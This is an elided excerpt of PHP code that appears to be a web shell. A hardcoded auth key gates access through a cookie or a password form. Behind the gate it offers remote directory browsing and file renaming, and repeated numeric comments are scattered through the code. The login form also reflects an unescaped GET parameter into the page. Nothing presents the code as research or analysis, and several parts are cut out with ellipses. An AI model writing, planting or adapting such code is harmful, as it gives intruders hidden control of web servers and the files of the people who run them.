...
$auth_key = "8e4f549ac9ccf49c3fd6f0d6924a854f";
...
$pass = false;
if (isset($_COOKIE['pw_name_78323'])) {
    if(($_COOKIE['pw_name_78323']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_78323'])) {
        if(($_POST['pw_name_78323']) == $auth_key) {
            setcookie("pw_name_78323", $_POST['pw_name_78323']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_78323' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724241538471301 1724241538424922 1724241538969969 1724241538877338
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724241538471301 1724241538424922 1724241538969969 1724241538877338
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724241538471301 1724241538424922 1724241538969969 1724241538877338
            $name = PATH . "/" . $_GET['r'];
